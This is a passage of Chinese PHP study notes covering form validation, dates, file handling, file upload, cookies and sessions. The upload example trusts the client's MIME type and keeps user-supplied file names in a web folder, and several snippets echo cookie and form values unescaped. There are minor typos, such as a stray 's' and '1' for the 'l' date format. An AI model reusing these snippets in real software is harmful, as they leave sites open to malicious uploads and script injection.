href="#PHP-表单验证-验证-E-mail-和-URL" class="headerlink" title="PHP 表单验证 - 验证 E-mail 和 URL"></a>PHP 表单验证 - 验证 E-mail 和 URL</h3><h4 id="PHP-验证名字"><a href="#PHP-验证名字" class="headerlink" title="PHP - 验证名字"></a>PHP - 验证名字</h4><p><code>preg_match()</code> 函数检索字符串的模式，如果模式存在则返回 true，否则返回 false。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$name = test_input($_POST[<span class="string">"name"</span>]);</span><br><span class="line"><span class="keyword">if</span> (!preg_match(<span class="string">"/^[a-zA-Z ]*$/"</span>,$name)) &#123;</span><br><span class="line">  $nameErr = <span class="string">"只允许字母和空格！"</span>;s</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="PHP-验证-E-mail"><a href="#PHP-验证-E-mail" class="headerlink" title="PHP - 验证 E-mail"></a>PHP - 验证 E-mail</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$email = test_input($_POST[<span class="string">"email"</span>]);</span><br><span class="line"><span class="keyword">if</span> (!preg_match(<span class="string">"/([\w\-]+\@[\w\-]+\.[\w\-]+)/"</span>,$email)) &#123;</span><br><span class="line">  $emailErr = <span class="string">"无效的 email 格式！"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="PHP-验证-URL"><a href="#PHP-验证-URL" class="headerlink" title="PHP - 验证 URL"></a>PHP - 验证 URL</h4><p>以下代码展示的方法检查 URL 地址语法是否有效（这条正则表达式同时允许 URL 中的斜杠）。如果 URL 地址语法无效，则存储一条错误消息：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$website = test_input($_POST[<span class="string">"website"</span>]);</span><br><span class="line"><span class="keyword">if</span> (!preg_match(<span class="string">"/\b(?:(?:https?|ftp):\/\/|www\.)[-a-z0-9+&amp;@#\/%?=~_|!:,.;]*[-a-z0-9+&amp;@#\/%</span></span><br><span class="line"><span class="string">=~_|]/i"</span>,$website)) &#123;</span><br><span class="line">  $websiteErr = <span class="string">"无效的 URL"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="PHP-保留表单中的值"><a href="#PHP-保留表单中的值" class="headerlink" title="PHP - 保留表单中的值"></a>PHP - 保留表单中的值</h3><p>如需在用户点击提交按钮后在输入字段中显示值，我们在以下输入字段的 value 属性中增加了一小段 PHP 脚本：name、email 以及 website。在 comment 文本框字段中，我们把脚本放到了 <textarea> 与 </textarea> 之间。这些脚本输出 $name、$email、$website 和 $comment 变量的值。</p><p>然后，我们还需要显示选中了哪个单选按钮。对此，我们必须操作 checked 属性（而非单选按钮的 value 属性）：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Name: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"name"</span> <span class="attr">value</span>=<span class="string">"&lt;?php echo $name;?&gt;"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">E-mail: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"email"</span> <span class="attr">value</span>=<span class="string">"&lt;?php echo $email;?&gt;"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">Website: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"website"</span> <span class="attr">value</span>=<span class="string">"&lt;?php echo $website;?&gt;"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">Comment: <span class="tag">&lt;<span class="name">textarea</span> <span class="attr">name</span>=<span class="string">"comment"</span> <span class="attr">rows</span>=<span class="string">"5"</span> <span class="attr">cols</span>=<span class="string">"40"</span>&gt;</span><span class="php"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> $comment;<span class="meta">?&gt;</span></span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br><span class="line"></span><br><span class="line">Gender:</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"radio"</span> <span class="attr">name</span>=<span class="string">"gender"</span></span></span><br><span class="line">&lt;?php if (isset($gender) &amp;&amp; $gender=="female") echo "checked";?&gt;</span><br><span class="line">value="female"&gt;Female</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"radio"</span> <span class="attr">name</span>=<span class="string">"gender"</span></span></span><br><span class="line">&lt;?php if (isset($gender) &amp;&amp; $gender=="male") echo "checked";?&gt;</span><br><span class="line">value="male"&gt;Male</span><br></pre></td></tr></table></figure><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.w3school.com.cn/php/index.asp" target="_blank" rel="noopener">w3school</a></p><h2 id="基础语法2"><a href="#基础语法2" class="headerlink" title="基础语法2"></a>基础语法2</h2><h3 id="PHP-多维数组"><a href="#PHP-多维数组" class="headerlink" title="PHP 多维数组"></a>PHP 多维数组</h3><p>二维数组实例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$cars = <span class="keyword">array</span></span><br><span class="line">  (</span><br><span class="line">  <span class="keyword">array</span>(<span class="string">"Volvo"</span>,<span class="number">22</span>,<span class="number">18</span>),</span><br><span class="line">  <span class="keyword">array</span>(<span class="string">"BMW"</span>,<span class="number">15</span>,<span class="number">13</span>),</span><br><span class="line">  <span class="keyword">array</span>(<span class="string">"Saab"</span>,<span class="number">5</span>,<span class="number">2</span>),</span><br><span class="line">  <span class="keyword">array</span>(<span class="string">"Land Rover"</span>,<span class="number">17</span>,<span class="number">15</span>)</span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ($row = <span class="number">0</span>; $row &lt; <span class="number">4</span>; $row++) &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;p&gt;&lt;b&gt;Row number $row&lt;/b&gt;&lt;/p&gt;"</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;ul&gt;"</span>;</span><br><span class="line">  <span class="keyword">for</span> ($col = <span class="number">0</span>; $col &lt; <span class="number">3</span>; $col++) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;li&gt;"</span>.$cars[$row][$col].<span class="string">"&lt;/li&gt;"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;/ul&gt;"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="PHP-日期和时间"><a href="#PHP-日期和时间" class="headerlink" title="PHP 日期和时间"></a>PHP 日期和时间</h3><h4 id="PHP-Date-函数"><a href="#PHP-Date-函数" class="headerlink" title="PHP Date() 函数"></a>PHP Date() 函数</h4><p><code>date(format,timestamp)</code>:</p><ul><li>format：必需。规定时间戳的格式。</li><li>timestamp：可选。规定时间戳。默认是当前时间和日期。</li></ul><p>下面列出了一些常用于日期的字符：</p><ul><li>d - 表示月里的某天（01-31）</li><li>m - 表示月（01-12）</li><li>Y - 表示年（四位数）</li><li>1 - 表示周里的某天</li></ul><h4 id="PHP-提示-自动版权年份"><a href="#PHP-提示-自动版权年份" class="headerlink" title="PHP 提示 - 自动版权年份"></a>PHP 提示 - 自动版权年份</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">© 2010-<span class="php"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> date(<span class="string">"Y"</span>)<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>下面是常用于时间的字符：</p><ul><li>h - 带有首位零的 12 小时小时格式</li><li>i - 带有首位零的分钟</li><li>s - 带有首位零的秒（00 -59）</li><li>a - 小写的午前和午后（am 或 pm）</li></ul><p>注释：请注意 PHP date() 函数会返回<strong>服务器</strong>的当前日期/时间！</p><h4 id="获得时区"><a href="#获得时区" class="headerlink" title="获得时区"></a>获得时区</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">date_default_timezone_set(<span class="string">"Asia/Shanghai"</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"当前时间是 "</span> . date(<span class="string">"h:i:sa"</span>);</span><br></pre></td></tr></table></figure><h4 id="通过-PHP-mktime-创建日期"><a href="#通过-PHP-mktime-创建日期" class="headerlink" title="通过 PHP mktime() 创建日期"></a>通过 PHP mktime() 创建日期</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mktime(hour,minute,second,month,day,year)</span><br><span class="line"></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$d=mktime(<span class="number">9</span>, <span class="number">12</span>, <span class="number">31</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">2015</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"创建日期是 "</span> . date(<span class="string">"Y-m-d h:i:sa"</span>, $d);</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><h4 id="通过-PHP-strtotime-用字符串来创建日期"><a href="#通过-PHP-strtotime-用字符串来创建日期" class="headerlink" title="通过 PHP strtotime() 用字符串来创建日期"></a>通过 PHP strtotime() 用字符串来创建日期</h4><p>PHP strtotime() 函数用于把人类可读的字符串转换为 Unix 时间。PHP 在将字符串转换为日期这方面非常聪明，所以您能够使用各种值：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$d=strtotime(<span class="string">"tomorrow"</span>);</span><br><span class="line"><span class="keyword">echo</span> date(<span class="string">"Y-m-d h:i:sa"</span>, $d) . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"></span><br><span class="line">$d=strtotime(<span class="string">"next Saturday"</span>);</span><br><span class="line"><span class="keyword">echo</span> date(<span class="string">"Y-m-d h:i:sa"</span>, $d) . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"></span><br><span class="line">$d=strtotime(<span class="string">"+3 Months"</span>);</span><br><span class="line"><span class="keyword">echo</span> date(<span class="string">"Y-m-d h:i:sa"</span>, $d) . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h4><p>下例输出下周六的日期：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$startdate = strtotime(<span class="string">"Saturday"</span>);</span><br><span class="line">$enddate = strtotime(<span class="string">"+6 weeks"</span>,$startdate);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> ($startdate &lt; $enddate) &#123;</span><br><span class="line">  <span class="keyword">echo</span> date(<span class="string">"M d"</span>, $startdate),<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">  $startdate = strtotime(<span class="string">"+1 week"</span>, $startdate);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下例输出七月四日之前的天数：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$d1=strtotime(<span class="string">"December 31"</span>);</span><br><span class="line">$d2=ceil(($d1-time())/<span class="number">60</span>/<span class="number">60</span>/<span class="number">24</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"距离十二月三十一日还有："</span> . $d2 .<span class="string">" 天。"</span>;</span><br></pre></td></tr></table></figure><h3 id="PHP-Include"><a href="#PHP-Include" class="headerlink" title="PHP Include"></a>PHP Include</h3><p>服务器端包含 (SSI) 用于创建可在多个页面重复使用的函数、页眉、页脚或元素。通过 <code>include</code> 或 <code>require</code> 语句，可以将 PHP 文件的内容插入另一个 PHP 文件（<font color=orangered>在服务器执行它之前</font>）。</p><p><code>include</code> 和 <code>require</code> 语句是相同的，<font color=orangered>除了错误处理方面</font>：</p><ul><li><code>require</code> 会生成致命错误（E_COMPILE_ERROR）并停止脚本</li><li><code>include</code> 只生成警告（E_WARNING），并且脚本会继续</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span> <span class="string">'filename'</span>;</span><br><span class="line"><span class="keyword">require</span> <span class="string">'filename'</span>;</span><br></pre></td></tr></table></figure><ul><li>请在此时使用 <code>require</code>：当文件被应用程序请求时。</li><li>请在此时使用 <code>include</code>：当文件不是必需的，且应用程序在文件未找到时应该继续运行时。</li></ul><h3 id="PHP-文件处理"><a href="#PHP-文件处理" class="headerlink" title="PHP 文件处理"></a>PHP 文件处理</h3><h4 id="PHP-操作文件"><a href="#PHP-操作文件" class="headerlink" title="PHP 操作文件"></a>PHP 操作文件</h4><p>常见的文件操作错误是：</p><ul><li>编辑错误的文件</li><li>被垃圾数据填满硬盘</li><li>意外删除文件内容</li></ul><p><code>readfile()</code> 函数读取文件，并把它写入输出缓冲。</p><h3 id="PHP-文件打开-读取-关闭"><a href="#PHP-文件打开-读取-关闭" class="headerlink" title="PHP 文件打开/读取/关闭"></a>PHP 文件打开/读取/关闭</h3><p>打开文件的更好的方法是通过 <code>fopen()</code> 函数。此函数为您提供比 <code>readfile()</code> 函数更多的选项。</p><ul><li><p><code>fopen()</code> 的第一个参数包含被打开的文件名，第二个参数规定打开文件的模式。如果 <code>fopen()</code> 函数未能打开指定的文件，下面的例子会生成一段消息：</p>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$myfile = fopen(<span class="string">"webdictionary.txt"</span>, <span class="string">"r"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Unable to open file!"</span>);</span><br><span class="line"><span class="keyword">echo</span> fread($myfile,filesize(<span class="string">"webdictionary.txt"</span>));</span><br><span class="line">fclose($myfile);</span><br></pre></td></tr></table></figure></li><li><p><code>fread()</code> 函数读取打开的文件。</p></li><li><p><code>fclose()</code> 函数用于关闭打开的文件（或者存有文件名的变量）。用完文件后把它们全部关闭是一个良好的编程习惯。您并不想打开的文件占用您的服务器资源。</p></li><li><p><code>fgets()</code> 函数用于从文件读取单行。<font color=orangered>调用 fgets() 函数之后，文件指针会移动到下一行</font>。</p></li><li><p><code>feof()</code> 函数检查是否已到达 “end-of-file” (EOF)。<code>feof()</code> 对于遍历未知长度的数据很有用。</p>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$myfile = fopen(<span class="string">"webdictionary.txt"</span>, <span class="string">"r"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Unable to open file!"</span>);</span><br><span class="line"><span class="comment">// 输出单行直到 end-of-file</span></span><br><span class="line"><span class="keyword">while</span>(!feof($myfile)) &#123;</span><br><span class="line"><span class="keyword">echo</span> fgets($myfile) . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line">fclose($myfile);</span><br></pre></td></tr></table></figure></li><li><p><code>fgetc()</code> 函数用于从文件中读取单个字符。</p></li></ul><h3 id="PHP-文件创建-写入"><a href="#PHP-文件创建-写入" class="headerlink" title="PHP 文件创建/写入"></a>PHP 文件创建/写入</h3><ul><li><p><code>fopen()</code> 创建文件。如果用 <code>fopen()</code> 打开并不存在的文件，此函数会创建文件，假定文件被打开为写入（w）或增加（a）。<br>  如果试图运行这段代码时发生错误，请检查您是否有向硬盘写入信息的 PHP <font color=orangered>文件访问权限</font>。</p></li><li><p><code>fwrite()</code> 函数用于写入文件。<code>fwrite()</code> 的第一个参数包含要写入的文件的文件名，第二个参数是被写的字符串。<br>  如果现在 “newfile.txt” 包含了一些数据，我们可以展示在写入已有文件时发生的的事情。所有已存在的数据会被<strong>擦除</strong>并以一个新文件开始。</p></li></ul><h3 id="PHP-文件上传"><a href="#PHP-文件上传" class="headerlink" title="PHP 文件上传"></a>PHP 文件上传</h3><p><code>&lt;form&gt;</code> 标签的 enctype 属性规定了在提交表单时要使用哪种内容类型。在表单需要二进制数据时，比如文件内容，请使用 <code>&quot;multipart/form-data&quot;</code>。<br><code>&lt;input&gt;</code> 标签的 type=”file” 属性规定了应该把输入作为文件来处理。举例来说，当在浏览器中预览时，会看到输入框旁边有一个浏览按钮。</p><p>通过使用 PHP 的全局数组 <code>$_FILES</code>，你可以从客户计算机向远程服务器上传文件。</p><p>第一个参数是表单的 input name，第二个下标可以是 “name”, “type”, “size”, “tmp_name” 或 “error”。就像这样：</p><ul><li><code>$_FILES[&quot;file&quot;][&quot;name&quot;]</code> - 被上传文件的名称</li><li><code>$_FILES[&quot;file&quot;][&quot;type&quot;]</code> - 被上传文件的类型</li><li><code>$_FILES[&quot;file&quot;][&quot;size&quot;]</code> - 被上传文件的大小，以字节计</li><li><code>$_FILES[&quot;file&quot;][&quot;tmp_name&quot;]</code> - 存储在服务器的文件的临时副本的名称</li><li><code>$_FILES[&quot;file&quot;][&quot;error&quot;]</code> - 由文件上传导致的错误代码</li></ul><p>这是一种非常简单文件上传方式。基于安全方面的考虑，您应当增加有关什么用户有权上传文件的限制。</p><p><strong>注释</strong>：<em>对于 IE，识别 jpg 文件的类型必须是 pjpeg，对于 FireFox，必须是 jpeg</em>。</p><p>要保存被上传的文件，我们需要把它拷贝到另外的位置：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/gif"</span>)</span><br><span class="line">|| ($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/jpeg"</span>)</span><br><span class="line">|| ($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/pjpeg"</span>))</span><br><span class="line">&amp;&amp; ($_FILES[<span class="string">"file"</span>][<span class="string">"size"</span>] &lt; <span class="number">20000</span>))</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ($_FILES[<span class="string">"file"</span>][<span class="string">"error"</span>] &gt; <span class="number">0</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Return Code: "</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"error"</span>] . <span class="string">"&lt;br /&gt;"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Upload: "</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>] . <span class="string">"&lt;br /&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Type: "</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] . <span class="string">"&lt;br /&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Size: "</span> . ($_FILES[<span class="string">"file"</span>][<span class="string">"size"</span>] / <span class="number">1024</span>) . <span class="string">" Kb&lt;br /&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Temp file: "</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>] . <span class="string">"&lt;br /&gt;"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (file_exists(<span class="string">"upload/"</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">echo</span> $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>] . <span class="string">" already exists. "</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      move_uploaded_file($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>],</span><br><span class="line">      <span class="string">"upload/"</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]);</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">"Stored in: "</span> . <span class="string">"upload/"</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"Invalid file"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="PHP-Cookies"><a href="#PHP-Cookies" class="headerlink" title="PHP Cookies*"></a>PHP Cookies*</h3><p>cookie 常用于识别用户。cookie 是服务器留在用户计算机中的小文件。每当相同的计算机通过浏览器请求页面时，它同时会发送 cookie。通过 PHP，您能够<em>创建并取回</em> cookie 的值。</p><h4 id="创建-cookie"><a href="#创建-cookie" class="headerlink" title="创建 cookie"></a>创建 cookie</h4><p><code>setcookie()</code> 函数用于设置 cookie。<code>setcookie()</code> 函数必须位于 <code>&lt;html&gt;</code> 标签之前。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setcookie(name, value, expire, path, domain);</span><br></pre></td></tr></table></figure><p>在发送 cookie 时，cookie 的值会自动进行 URL 编码，在取回时进行自动解码（为防止 URL 编码，请使用 <code>setrawcookie()</code> 取而代之；也可以尝试使用<code>urldecode($str)</code>解码）。</p><h4 id="取回-Cookie-的值"><a href="#取回-Cookie-的值" class="headerlink" title="取回 Cookie 的值"></a>取回 Cookie 的值</h4><p>PHP 的 <code>$_COOKIE</code> 变量用于取回 cookie 的值。使用 <code>isset()</code> 函数来确认是否已设置了 cookie：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">      <span class="keyword">if</span> (<span class="keyword">isset</span>($_COOKIE[<span class="string">"user"</span>]))</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">"Welcome "</span> . $_COOKIE[<span class="string">"user"</span>] . <span class="string">"!&lt;br /&gt;"</span>;</span></span><br><span class="line"><span class="php">      <span class="keyword">else</span></span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">"Welcome guest!&lt;br /&gt;"</span>;</span></span><br><span class="line"><span class="php">    <span class="meta">?&gt;</span></span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="删除-cookie"><a href="#删除-cookie" class="headerlink" title="删除 cookie"></a>删除 cookie</h4><p>当删除 cookie 时，您应当使过期日期变更为过去的时间点。</p><h3 id="PHP-Sessions"><a href="#PHP-Sessions" class="headerlink" title="PHP Sessions*"></a>PHP Sessions*</h3><p>Session 变量用于存储有关用户会话的信息，或更改用户会话的设置。Session 变量保存的信息是单一用户的，并且可供应用程序中的所有页面使用。Session 的工作机制是：为每个访问者创建一个唯一的 id (UID)，并基于这个 UID 来存储变量。UID 存储在 cookie 中，亦或通过 URL 进行传导。</p><h4 id="开始-PHP-Session"><a href="#开始-PHP-Session" class="headerlink" title="开始 PHP Session"></a>开始 PHP Session</h4><p>在您把用户信息存储到 PHP session 中之前，首先必须启动会话。<code>session_start()</code> 函数必须位于 <code>&lt;html&gt;</code> 标签之前，同时会为用户会话分配一个 UID：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span> session_start(); <span class="meta">?&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="存储-Session-变量"><a href="#存储-Session-变量" class="headerlink" title="存储 Session 变量"></a>存储 Session 变量</h4><p>存储和取回 session 变量的正确方法是使用 PHP <code>$_SESSION</code> 变量：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_SESSION[<span class="string">'views'</span>]))</span><br><span class="line">  $_SESSION[<span class="string">'views'</span>]=$_SESSION[<span class="string">'views'</span>]+<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  $_SESSION[<span class="string">'views'</span>]=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Views="</span>. $_SESSION[<span class="string">'views'</span>];</span><br></pre></td></tr></table></figure><h4 id="终结-Session"><a href="#终结-Session" class="headerlink" title="终结 Session"></a>终结 Session</h4><p>可以使用 <code>unset()</code> 或 <code>session_destroy()</code> 函数。</p><ul><li><code>unset()</code> 函数用于释放指定的 session 变量。</li><li><code>session_destroy()</code> 将重置 session，您将失去所有已存储的 session 数据。</li></ul><h3 id="PHP-防止-E-mail-注入"><a href="#PHP-防止-E-mail-注入" class="headerlink" title="PHP 防止 E-mail 注入"></a>PHP 防止 E-mail 注入</h3><p>使用 PHP 过滤器来对输入进行验证：</p><ul><li><code>FILTER_SANITIZE_EMAIL</code> 从字符串中删除电子邮件的非法字符</li><li><code>FILTER_VALIDATE_EMAIL</code> 验证电子邮件地址</li></ul><h3 id="PHP-错误处理"><a href="#PHP-错误处理" class="headerlink" title="PHP 错误处理"></a>PHP 错误处理</h3><p>基本的错误处理：使用 <code>die()</code> 函数。</p><h3 id="PHP-异常处理"><a href="#PHP-异常处理" class="headerlink" title="PHP 异常处理"></a>PHP 异常处理</h3><p>异常（Exception）用于在指定的错误发生时改变脚本的正常流程。正确的处理程序应当包括：</p><ul><li>Try - 使用异常的函数应该位于 “try” 代码块内。如果没有触发异常，则代码将照常继续执行。但是如果异常被触发，会抛出一个异常。</li><li>Throw - 这里规定如何触发异常。每一个 “throw” 必须对应至少一个 “catch”</li><li>Catch - “catch” 代码块会捕获异常，并创建一个包含异常信息的对象</li></ul><p>异常的规则：</p><ul><li>需要进行异常处理的代码应该放入 try 代码块内，以便捕获潜在的异常。</li><li>每个 try 或 throw 代码块必须至少拥有一个对应的 catch 代码块。</li><li>使用多个 catch 